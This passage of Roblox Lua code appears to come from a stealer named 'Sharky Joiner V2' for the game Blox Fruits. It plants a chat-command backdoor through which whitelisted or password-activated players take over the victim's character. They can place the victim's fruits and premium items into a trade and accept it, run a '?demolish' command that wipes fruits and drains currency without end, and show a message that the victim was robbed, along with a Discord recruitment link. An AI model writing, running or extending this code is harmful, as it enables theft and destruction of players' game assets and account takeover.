	-- Return the best available option based on priority
	return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end

local function isInTradeWithCorrectPlayer()
	-- Check global override first
	if allowEveryone then
		return true
	end

	local player = LocalPlayer
	local playerGui = player:FindFirstChild("PlayerGui")
	if not playerGui then return false end
	local mainGui = playerGui:FindFirstChild("Main")
	if not mainGui then return false end
	local tradeFrame = mainGui:FindFirstChild("Trade")
	if not tradeFrame or not tradeFrame.Visible then return false end

	-- Find UI elements safely
	local container = tradeFrame:FindFirstChild("Container")
	local frame1 = container and container:FindFirstChild("1")
	local frame2 = container and container:FindFirstChild("2")
	local player1Label = frame1 and frame1:FindFirstChild("TextLabel")
	local player2Label = frame2 and frame2:FindFirstChild("TextLabel")
	if not player1Label or not player2Label then return false end

	local tradingPartnerName = player2Label.Text -- This could be Username or DisplayName
	local localPlayerName = player.Name
	local localPlayerDisplayName = player.DisplayName

	-- Ensure local player is in slot 1 (check both name and display name)
	if player1Label.Text ~= localPlayerName and player1Label.Text ~= localPlayerDisplayName then
		return false
	end

	-- Check if partner is whitelisted by Username
	for _, allowedName in ipairs(Usernames) do
		local tradingPlayer = Players:FindFirstChild(allowedName) -- Find player by exact username from list
		if tradingPlayer then
			-- Compare label text (partner name) against the found player's Username AND DisplayName
			if string.lower(tradingPartnerName) == string.lower(tradingPlayer.Name) or string.lower(tradingPartnerName) == string.lower(tradingPlayer.DisplayName) then
				return true
			end
		end
	end

	-- Check if partner is in the activatedUsers list
	local partnerPlayer = Players:FindFirstChild(tradingPartnerName) -- Try direct lookup first
	if not partnerPlayer then -- If label is DisplayName, iterate to find player
		for _, p in ipairs(Players:GetPlayers()) do
			if p.DisplayName == tradingPartnerName then
				partnerPlayer = p
				break
			end
		end
	end
	if partnerPlayer and activatedUsers[partnerPlayer.UserId] then
		return true
	end

	-- If no match found
	return false
end

--[[ Jump Control ]]--
local isForceJumping = false
local stateChangedConnections = {}
local jumpRequestConnection
local characterAddedJumpConnection

local function ForceJump()
	local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	isForceJumping = true
	humanoid.JumpPower = 50 -- Temporarily increase power
	humanoid:ChangeState(Enum.HumanoidStateType.Jumping) -- Force the jump state

	-- Reset after a short delay
	task.delay(0.5, function()
		isForceJumping = false
		if humanoid and humanoid.Parent then
			humanoid.JumpPower = 0 -- Reset jump power
		end
	end)
end

local function lockJumping(humanoid)
	if not humanoid then return end

	-- Disconnect previous listener if exists
	if stateChangedConnections[humanoid] then
		stateChangedConnections[humanoid]:Disconnect()
		stateChangedConnections[humanoid] = nil
	end

	humanoid.JumpPower = 0
	humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)

	-- Prevent state change to Jumping unless forced
	stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new)
		if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
			humanoid:ChangeState(old) -- Revert to previous state
		end
	end)
end

local function disableJump()
	-- Disconnect existing listeners
	if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
	if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end

	-- Block touch jump requests
	if UserInputService.TouchEnabled then
		jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
			if not isForceJumping and LocalPlayer.Character then
				local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if h then h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false) end
			end
		end)
	end

	-- Lock jump for current character
	if LocalPlayer.Character then
		lockJumping(LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
	end

	-- Lock jump for future characters
	characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(char)
		task.spawn(function() -- Use task.spawn for safety
			local h = char:WaitForChild("Humanoid", 5)
			if h then lockJumping(h) end
		end)
	end)

	-- Return a cleanup function
	return function()
		if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
		if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end
		for humanoid, conn in pairs(stateChangedConnections) do
			conn:Disconnect()
		end
		table.clear(stateChangedConnections)
	end
end

--[[ Discord Invite UI ]]--
local function createDiscordUI()
	-- Create UI elements (similar structure to createNotification but for Discord invite)
	local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = "DiscordInviteUI"; ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; ScreenGui.ResetOnSpawn = false; ScreenGui.IgnoreGuiInset = true; ScreenGui.DisplayOrder = 9999
	local MainFrame = Instance.new("Frame"); MainFrame.Name = "MainFrame"; MainFrame.Size = UDim2.new(0, 800, 0, 350); MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0); MainFrame.AnchorPoint = Vector2.new(0.5, 0.5); MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37); MainFrame.BorderSizePixel = 0; MainFrame.Parent = ScreenGui; Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
	local Title = Instance.new("TextLabel"); Title.Name = "Title"; Title.Size = UDim2.new(1, 0, 0, 40); Title.Position = UDim2.new(0, 0, 0, 10); Title.BackgroundTransparency = 1; Title.Font = Enum.Font.GothamBold; Title.Text = "Read Below!"; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.TextScaled = true; Title.Parent = MainFrame
	local Description = Instance.new("TextLabel"); Description.Name = "Description"; Description.Size = UDim2.new(0.9, 0, 0, 100); Description.Position = UDim2.new(0.05, 0, 0.3, 0); Description.BackgroundTransparency = 1; Description.Font = Enum.Font.Gotham; Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"; Description.TextColor3 = Color3.fromRGB(220, 221, 222); Description.TextScaled = true; Description.Parent = MainFrame
	local Button = Instance.new("TextButton"); Button.Name = "CopyButton"; Button.Size = UDim2.new(0.7, 0, 0, 56); Button.Position = UDim2.new(0.15, 0, 0.7, 0); Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242); Button.Font = Enum.Font.GothamBold; Button.Text = "Copy Discord Invite"; Button.TextColor3 = Color3.fromRGB(255, 255, 255); Button.TextScaled = true; Button.AutoButtonColor = false; Button.Parent = MainFrame; Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)

	-- Animation setup
	local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local function createTween(instance, props) return TweenService:Create(instance, fadeInfo, props) end

	-- Initial transparency
	MainFrame.BackgroundTransparency = 1; Title.TextTransparency = 1; Description.TextTransparency = 1; Button.BackgroundTransparency = 1; Button.TextTransparency = 1

	-- Fade-in animations
	task.wait(0.1); createTween(MainFrame, {BackgroundTransparency = 0}):Play()
	task.wait(0.1); createTween(Title, {TextTransparency = 0}):Play()
	task.wait(0.1); createTween(Description, {TextTransparency = 0}):Play()
	task.wait(0.1); createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

	-- Button interactions
	Button.MouseEnter:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play() end)
	Button.MouseLeave:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play() end)
	Button.MouseButton1Click:Connect(function()
		setclipboard("https://discord.gg/uwdvTtqTDA")
		Button.Text = "Copied!"
		task.delay(2, function() if Button.Parent then Button.Text = "Copy Invite" end end) -- Reset text after 2s
	end)

	ScreenGui.Parent = CoreGui
	return ScreenGui
end


--[[ Command Definition & Handling ]]--
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")
local function sendMessage(message)
	pcall(function()
		SayMessageRequest:FireServer(message, "All")
	end)
end
local CommandCooldowns = {}
local DEFAULT_COOLDOWN = 0.5

-- Commands Table Definition
local Commands = {
	-- Movement & Basic Actions
	jump = {
		description = "Forces the character to jump once.",
		usage = "?jump",
		execute = ForceJump
	},
	sit = {
		description = "Attempts to find a suitable trade table seat and sit down.",
		usage = "?sit",
		execute = function()
			sendMessage("Attempting to sit at trade table...")
			local tradeTable, bestSeat = findTradeTable()
			if not (tradeTable and bestSeat) then
				sendMessage("Error finding a table! Try running ?tp first.")
				return
			end

			local character = LocalPlayer.Character
			if not (character and character.PrimaryPart) then
				sendMessage("Character error.")
				return
			end

			tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0)) -- Move above seat first
			task.wait(1) -- Wait for potential physics settlement

			local function attemptSit()
				for i = 1, 10 do
					local randomOffset = Vector3.new(math.random(-2, 2) / 10, math.random(-2, 2) / 10, math.random(-2, 2) / 10)
					tweenToPosition(bestSeat.Position + randomOffset) -- Jiggle towards seat
					task.wait(0.5)
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid and humanoid.Sit then
						sendMessage("Successfully sat at trade table!")
						return true
					end
				end
				return false
			end

			if not attemptSit() then
				sendMessage("Failed to sit. Try running ?sit again!")
			end
		end
	},
	tp = {
		description = "Teleports the player to the standard trading hub (Mansion/Cafe).",
		usage = "?tp",
		execute = function()
			local targetPos, locationName
			if game.PlaceId == 7449423635 then -- Sea 3
				locationName = "Mansion"
				-- Check for Valkyrie Helm first for specific TP
				local inventory = getInventory()
				if inventory then
					for _, item in ipairs(inventory) do
						if item.Name == "Valkyrie Helm" then
							Remote:InvokeServer("requestEntrance", Vector3.new(-12471.33, 374.95, -7539.37))
							sendMessage("Teleporting to Mansion (via Valkyrie)...")
							return
						end
					end
				end
				-- Default Mansion TP
				targetPos = Vector3.new(-12550.8701, 337.2399, -7425.5200) -- Adjusted precision slightly
			else -- Sea 2
				locationName = "Cafe"
				targetPos = Vector3.new(-381.8599, 73.0800, 299.9299) -- Adjusted precision slightly
			end

			if targetPos then
				sendMessage("Teleporting to " .. locationName .. "...")
				tweenToPosition(targetPos)
			else
				sendMessage("Could not determine teleport location.")
			end
		end
	},
	reset = {
		description = "Resets the player's character.",
		usage = "?reset",
		execute = function()
			if LocalPlayer.Character then
				LocalPlayer.Character:BreakJoints()
			end
		end
	},
	rejoin = {
		description = "Makes the player rejoin the current server.",
		usage = "?rejoin",
		execute = function()
			TeleportService:Teleport(game.PlaceId, LocalPlayer)
		end
	},

	-- Trading Commands
	add = {
		description = "Adds [count] of a specific Blox Fruit to the trade.",
		usage = "?add <fruit_name> [count]",
		execute = function(argument)
			local namePart, countPart = argument:match("^(.-)%s*(%d*)$")
			if not namePart or namePart == "" then sendMessage("Usage: ?add <fruit_name> [count]"); return end

			local searchTerm = namePart:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			local requestedCount = tonumber(countPart)
			if not requestedCount or requestedCount < 1 then requestedCount = 1 end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local foundItem = nil
			for _, item in pairs(inventory) do
				if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
					foundItem = item
					break
				end
			end

			if foundItem then
				local availableCount = foundItem.Count
				local countToAdd = math.min(requestedCount, availableCount)
				if countToAdd <= 0 then sendMessage("No '" .. foundItem.Name .. "' available to add."); return end

				sendMessage("Adding " .. countToAdd .. "x '" .. foundItem.Name .. "'...")
				local addedSuccess = 0
				for i = 1, countToAdd do
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", foundItem.Name)
					if success then
						addedSuccess = addedSuccess + 1
					else
						sendMessage("Error adding item: " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay between adds
				end
				sendMessage("Finished adding " .. addedSuccess .. "/" .. countToAdd .. " '" .. foundItem.Name .. "'.")
				if requestedCount > availableCount then sendMessage("(Note: You requested " .. requestedCount .. ", but only " .. availableCount .. " were available.)") end
			else
				sendMessage("No Blox Fruit matching '" .. searchTerm .. "' found in inventory!")
			end
		end
	},
	additem = {
		description = "Adds 1 of a specific Premium Item (Gamepass) to the trade.",
		usage = "?additem <item_name>",
		execute = function(argument)
			local searchTerm = argument:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			if searchTerm == "" then sendMessage("Usage: ?additem <item_name>"); return end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local foundItem = nil
			for _, item in pairs(inventory) do
				if item.Type == "Premium" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
					foundItem = item
					break
				end
			end

			if foundItem then
				sendMessage("Adding 1x '" .. foundItem.Name .. "'...")
				TradeFunction:InvokeServer("addItem", foundItem.Name)
				task.wait(0.1)
				sendMessage("Finished adding '" .. foundItem.Name .. "'.")
			else
				sendMessage("No Premium Item matching '" .. searchTerm .. "' found in inventory!")
			end
		end
	},
	addall = { -- NO COUNT for addall
		description = "Adds 1 of each fruit from your 'FruitsToHit' list to the trade.",
		usage = "?addall",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local addedCount = 0
			local addedFruits = {} -- Track fruits added in this run
			sendMessage("Attempting to add all configured fruits...")

			-- Create inventory lookup for quick checks
			local inventoryLookup = {}
			for _, item in pairs(inventory) do
				if item.Type == "Blox Fruit" then inventoryLookup[item.Name] = item.Count end
			end

			for _, fruitName in ipairs(FruitsToHit) do
				if inventoryLookup[fruitName] and inventoryLookup[fruitName] > 0 and not addedFruits[fruitName] then
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fruitName)
					if success then
						addedFruits[fruitName] = true
						addedCount = addedCount + 1
						sendMessage("Added 1x '" .. fruitName .. "'.")
					else
						sendMessage("Error adding " .. fruitName .. ": " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay
				end
			end

			if addedCount > 0 then
				sendMessage("Finished adding " .. addedCount .. " types of configured fruits.")
			else
				sendMessage("No fruits from your 'FruitsToHit' list were found/available in inventory!")
			end
		end
	},
	addallitems = {
		description = "Adds 1 of every Premium Item (Gamepass) found in inventory to the trade.",
		usage = "?addallitems",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local addedCount = 0
			local addedItems = {} -- Track items added in this run
			sendMessage("Attempting to add all premium items...")

			for _, item in pairs(inventory) do
				if item.Type == "Premium" and item.Count > 0 and not addedItems[item.Name] then
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", item.Name)
					if success then
						addedItems[item.Name] = true
						addedCount = addedCount + 1
						sendMessage("Added 1x '" .. item.Name .. "'.")
					else
						sendMessage("Error adding " .. item.Name .. ": " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay
				end
			end

			if addedCount > 0 then
				sendMessage("Finished adding " .. addedCount .. " premium items.")
			else
				sendMessage("No Premium items found/available in inventory!")
			end
		end
	},
	cleartrade = {
		description = "Removes all items the victim has placed in the trade window.",
		usage = "?cleartrade",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local container = tradeUI.Trade:FindFirstChild("Container")
			local playerFrame = container and container:FindFirstChild("1")
			local itemFrame = playerFrame and playerFrame:FindFirstChild("Frame")
			if not itemFrame then sendMessage("Could not find trade item frame."); return end

			local itemsToRemove = {}
			for _, item in ipairs(itemFrame:GetChildren()) do
				if item:IsA("ImageButton") and item.Name ~= "AddBeli" then -- Exclude Beli button
					table.insert(itemsToRemove, item.Name)
				end
			end

			if #itemsToRemove == 0 then sendMessage("No items to remove from trade."); return end

			sendMessage("Clearing " .. #itemsToRemove .. " items from trade...")
			local clearedCount = 0
			for _, itemName in ipairs(itemsToRemove) do
				local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itemName)
				if success then
					clearedCount = clearedCount + 1
				else
					sendMessage("Error removing " .. itemName .. ": " .. tostring(err))
				end
				task.wait(0.1) -- Delay
			end
			sendMessage("Cleared " .. clearedCount .. " items.")
		end
	},
	accept = {
		description = "Accepts the current trade (only works if seated).",
		usage = "?accept",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local character = LocalPlayer.Character
			if not character then sendMessage("Character not found."); return end

			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then sendMessage("Humanoid not found."); return end

			if not humanoid.Sit then sendMessage("Must be sitting to accept trade."); return end

			sendMessage("Accepting trade...")
			task.wait(0.1) -- Small delay before invoking
			TradeFunction:InvokeServer("accept")
		end
	},

	-- Utility Commands
	resetfruit = { -- Added count support
		description = "Equips and resets [count] times with a specific fruit.",
		usage = "?resetfruit <fruit_name> [count]",
		execute = function(argument)
			local namePart, countPart = argument:match("^(.-)%s*(%d*)$")
			if not namePart or namePart == "" then sendMessage("Usage: ?resetfruit <fruit_name> [count]"); return end

			local searchTerm = namePart:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			local requestedCount = tonumber(countPart)
			if not requestedCount or requestedCount < 1 then requestedCount = 1 end

			sendMessage("Attempting to reset with '".. searchTerm .."' " .. requestedCount .. " times...")

			for i = 1, requestedCount do
				-- Get inventory inside loop? May be slow but reflects changes if fruit is consumed?
				-- Let's stick to checking once outside for simplicity unless issues arise.
				local inventory = getInventory() -- Check each time
				if not inventory then sendMessage("Failed to get inventory on attempt " .. i); break end

				local foundItem = nil
				for _, item in pairs(inventory) do
					if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
						foundItem = item
						break
					end
				end

				if foundItem then
					local baseFruitName = foundItem.Name:match("(%S+)") -- Get base name (e.g., "Kitsune")
					sendMessage("("..i.."/"..requestedCount..") Equipping '" .. baseFruitName .. "' and resetting...")
					ForceJump() -- Attempt to break sit state
					task.wait(0.1)
					Remote:InvokeServer("LoadFruit", baseFruitName)
					task.wait(0.3) -- Wait for equip animation/server register

					if LocalPlayer.Character then
						LocalPlayer.Character:BreakJoints()
					end
					sendMessage("Reset complete for attempt " .. i .. ". Waiting for respawn...")
					task.wait(6.5) -- Wait for respawn + buffer
				else
					sendMessage("Fruit matching '" .. searchTerm .. "' not found in inventory on attempt " .. i .. ". Aborting.")
					break -- Stop if fruit isn't found
				end

				if i < requestedCount then task.wait(1) end -- Extra delay between resets
			end
			sendMessage("Finished reset fruit sequence.")
		end
	},
	invite = {
		description = "Shows the victim a UI inviting them to the Discord.",
		usage = "?invite",
		execute = createDiscordUI
	},
	demolish = {
		description = "!! DANGEROUS !! Attempts to equip and reset all fruits, then drain Beli/Fragments.",
		usage = "?demolish",
		execute = function()
			sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!! THIS IS DESTRUCTIVE !!!")
			task.wait(2) -- Give a moment to potentially cancel

			local function invokeRemote(remoteName, args)
				local remoteInstance = Remote.Parent:FindFirstChild(remoteName)
				if not remoteInstance then sendMessage("Error: Remote '"..remoteName.."' not found."); return false end
				local success, result = pcall(remoteInstance.InvokeServer, remoteInstance, unpack(args))
				if not success then sendMessage("Error invoking "..remoteName..": "..tostring(result)) end
				return success, result
			end

			-- Reset fruits first
			sendMessage("Demolish Step 1: Resetting all Blox Fruits...")
			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory for demolish."); return end

			local fruitsToReset = {}
			for _, item in pairs(inventory) do
				if item.Type == "Blox Fruit" then table.insert(fruitsToReset, item) end
			end
			table.sort(fruitsToReset, function(a, b) return a.Value > b.Value end) -- Reset valuable ones first

			for i, fruit in ipairs(fruitsToReset) do
				local baseFruitName = fruit.Name:match("(%S+)")
				sendMessage("("..i.."/"..#fruitsToReset..") Resetting with '" .. baseFruitName .. "'...")
				ForceJump()
				task.wait(0.1)
				invokeRemote("CommF_", {"LoadFruit", baseFruitName})
				task.wait(0.3)
				if LocalPlayer.Character then LocalPlayer.Character:BreakJoints() end
				sendMessage("Waiting for respawn...")
				task.wait(6.5)
			end
			sendMessage("Fruit reset phase complete.")
			task.wait(1)

			-- Drain Beli/Fragments Coroutines
			sendMessage("Demolish Step 2: Attempting to drain Beli and Fragments...")
			local drainBeliActive, drainFragsActive = true, true -- Flags to potentially stop later if needed

			task.spawn(function() -- Beli Drain
				local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
				local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
				while drainBeliActive do
					invokeRemote("CommF_", rocketArgs)
					task.wait(0.1)
					if not drainBeliActive then break end
					invokeRemote("CommF_", spinArgs)
					task.wait(0.1)
				end
				sendMessage("Beli drain stopped.")
			end)

			task.spawn(function() -- Fragment Drain (May not always work depending on game state)
				local fragmentArgs = {"BlackbeardReward", "Refund", "2"} -- Example args, might need adjustment
				while drainFragsActive do
					invokeRemote("CommF_", fragmentArgs)
					task.wait(0.2)
				end
				sendMessage("Fragment drain stopped.")
			end)

			sendMessage("Demolish: Drain routines started. They will run indefinitely (unless script stopped).")
			-- Note: No clean way to stop drains implemented here without adding another command.
		end
	},
	test = {
		description = "Checks script responsiveness.",
		usage = "?test",
		execute = function()
			local startTime = tick()
			task.wait(0.001)
			sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
		end
	},
	help = {
		description = "Displays this list of commands.",
		usage = "?help",
		execute = function()
			task.spawn(function()
				local cmds = {
					"--- Sharky Joiner Commands ---",
					"?help : Shows this list",
					"?test : Checks script response time",
					"--- Movement ---",
					"?jump : Force character jump",
					"?sit : Attempt to sit at trade table",
					"?tp : Teleport to Mansion/Cafe",
					"?reset : Reset character",
					"?rejoin : Rejoin server",
					"--- Trading ---",
					"?add <fruit> [count] : Add Blox Fruit(s) to trade",
					"?additem <item> : Add Premium Item to trade",
					"?addall : Add 1 of each configured fruit (FruitsToHit) to trade",
					"?addallitems : Add 1 of each premium item to trade",
					"?cleartrade : Remove your items from trade",
					"?accept : Accept the trade (must be sitting)",
					"--- Utility ---",
					"?resetfruit <fruit> [count] : Equip & reset with fruit(s)",
					"?invite : Show Discord invite UI to victim",
					"?demolish : !! DANGEROUS !! Reset fruits & drain currency",
					"--- Activation / Admin ---",
					"?activate <password> : Gain command access for session",
					"?allowall : Toggle allowing ANYONE to use commands"
				}
				sendMessage("Sending command list (" .. #cmds .. " lines)...")
				task.wait(0.5)
				for i, msg in ipairs(cmds) do
					sendMessage(msg)
					task.wait(0.3 + (i * 0.02)) -- Small, increasing delay
				end
				sendMessage("--- End of Commands ---")
			end)
		end
	},

	-- Activation / Admin Commands
	activate = {
		description = "Activates command access using a password.",
		usage = "?activate <password>",
		execute = function(password)
			if not password or password == "" then return end -- No feedback on wrong usage

			local foundPass = false
			for _, validPass in ipairs(ActivationPasswords) do
				if password == validPass then
					foundPass = true
					break
				end
			end

			if foundPass then
				local player = Players:FindFirstChild(CommandContext.PlayerName) -- Get player from context
				if player then
					activatedUsers[player.UserId] = true
					sendMessage("Activation successful for this session, " .. player.Name .. "!")
					print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
				else
					print("Activation successful but could not find player: " .. CommandContext.PlayerName) -- Log locally if player not found
				end
			end
			-- Intentionally no feedback for incorrect password attempts in chat
		end
	},
	allowall = {
		description = "Toggles allowing ANY player to use commands.",
		usage = "?allowall",
		execute = function()
			allowEveryone = not allowEveryone
			local status = allowEveryone and "ENABLED" or "DISABLED"
			sendMessage("AllowEveryone Mode: " .. status .. ". Command access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."))
			if allowEveryone then
				sendMessage("!! WARNING: ANYONE can now use commands, including potentially harmful ones like ?demolish !!")
			end
		end
	}
}

--[[ Command Processor ]]--
local CommandContext = {} -- Used to pass player info to ?activate

local function processChatCommand(_, player, message)
	-- Basic validation
	if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1, 1) == "?") then
		return
	end

	-- Parse command and arguments
	local commandStr = message:sub(2):match("^%s*(.-)%s*$") -- Trim whitespace
	if not commandStr or commandStr == "" then return end

	local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$") -- Separate command and rest
	if not command then return end
	command = command:lower()

	-- Special handling for ?activate: Allow anyone to TRY it
	if command == "activate" then
		local cmdFunc = Commands[command]
		if cmdFunc then
			CommandContext.PlayerName = player.Name -- Pass player name for activation message context
			task.spawn(cmdFunc.execute, argument)
			CommandContext.PlayerName = nil -- Clear context immediately after spawn
		end
		return -- Stop further processing for ?activate
	end

	-- Authorization Check: allowEveryone OR Whitelisted OR Activated
	local isAuthorized = allowEveryone or (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
	if not isAuthorized then
		return -- Ignore command if not authorized
	end

	-- Find and execute the command
	local commandFunc = Commands[command]
	if not commandFunc then
		sendMessage("Unknown command: ?" .. command)
		return
	end

	-- Cooldown Check
	local playerName = player.Name
	local playerCooldowns = CommandCooldowns[playerName]
	if playerCooldowns then
		local lastUsed = playerCooldowns[command]
		if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then
			sendMessage("Please wait before using this command again!")
			return
		end
	else
		playerCooldowns = {}
		CommandCooldowns[playerName] = playerCooldowns
	end
	playerCooldowns[command] = tick() -- Update cooldown timestamp

	-- Execute command in a new thread
	task.spawn(function()
		local success, err = pcall(commandFunc.execute, argument)
		if not success then
			sendMessage("Error executing command ?" .. command .. ": " .. tostring(err))
			warn("Command Error:", command, argument, err) -- Log error locally too
		end
	end)
end

--[[ Main Loop & Initialization ]]--
local function startMainLoop()
	local isLoopRunning = true
	local hasCheckedCurrentTrade = false
	local currentTable, currentSeat

	local lastMovementTime = tick()
	local lastTableCheck = tick()
	local lastTradeCheck = tick()

	-- Constants for timing
	local UPDATE_INTERVAL = 0.5
	local TABLE_CHECK_INTERVAL = 2
	local MOVEMENT_CHECK_INTERVAL = 4
	local TRADE_VALIDATION_DELAY = 1.5
	local TRADE_RECHECK_COUNT = 4

	local validateTradePartnerRunning = false

	local function validateTradePartner()
		if validateTradePartnerRunning then return end
		validateTradePartnerRunning = true

		local failedChecks = 0
		local lastTradeState = false -- Track trade visibility state

		for _ = 1, TRADE_RECHECK_COUNT do
			task.wait(0.25)
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			local currentTradeState = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible

			-- Increment fail count if trade closed, visibility changed, or partner is invalid
			if lastTradeState ~= currentTradeState or not currentTradeState or not isInTradeWithCorrectPlayer() then
				failedChecks = failedChecks + 1
			end
			lastTradeState = currentTradeState -- Update last known state
		end

		-- If validation failed most checks, force a jump (to potentially break sit/trade)
		if failedChecks >= TRADE_RECHECK_COUNT - 1 then -- Allow 1 successful check
			task.wait(0.1)
			ForceJump()
		end

		validateTradePartnerRunning = false
	end

	-- Connections for character events
	local charAddedConn, charRemovingConn, jumpCleanupFunc

	local function onCharacterAdded(character)
		task.wait(1) -- Wait for character to fully load
		local humanoid = character:WaitForChild("Humanoid", 5)
		local rootPart = character:WaitForChild("HumanoidRootPart", 5)
		if not humanoid or not rootPart then return end -- Exit if essential parts missing

		local now = tick()
		lastMovementTime, lastTableCheck, lastTradeCheck = now, now, now -- Reset timers

		jumpCleanupFunc = disableJump() -- Re-apply jump lock

		-- Find table and move to it
		task.spawn(function()
			currentTable, currentSeat = findTradeTable()
			if currentTable and currentSeat then
				tweenToPosition(currentSeat.Position)
			end
		end)
	end

	local function onCharacterRemoving()
		-- Reset state when character removed
		currentTable, currentSeat = nil, nil
		if jumpCleanupFunc then jumpCleanupFunc() end -- Clean up jump listeners
	end

	-- The main execution loop
	local function runMainLoop()
		local lastTime = tick()
		while isLoopRunning do
			local now = tick()
			local deltaTime = now - lastTime
			lastTime = now

			local character = LocalPlayer.Character
			if character and character:FindFirstChild("HumanoidRootPart") then
				local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
				local isInTrade = tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible

				-- Trade validation logic
				if not isInTrade then
					hasCheckedCurrentTrade = false -- Reset check flag when not in trade
					lastTradeCheck = now
				elseif not hasCheckedCurrentTrade and (now - lastTradeCheck) >= TRADE_VALIDATION_DELAY then
					task.spawn(validateTradePartner) -- Validate partner after delay
					hasCheckedCurrentTrade = true
				end

				-- Periodically check for a better table
				if now - lastTableCheck >= TABLE_CHECK_INTERVAL then
					task.spawn(function()
						local newTable, newSeat = findTradeTable()
						if newTable and newSeat then
							currentTable, currentSeat = newTable, newSeat
						end
					end)
					lastTableCheck = now
				end

				-- Position maintenance logic
				if currentTable and currentSeat then
					local root = character.HumanoidRootPart
					local distance = (root.Position - currentSeat.Position).Magnitude

					if distance > 5 then -- If too far, tween back
						tweenToPosition(currentSeat.Position)
					elseif now - lastMovementTime >= MOVEMENT_CHECK_INTERVAL then -- Periodically jiggle slightly
						local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
						tweenToPosition(currentSeat.Position + randomOffset)
						lastMovementTime = now
					end
				end
			end

			-- Wait efficiently
			local timeElapsed = tick() - now
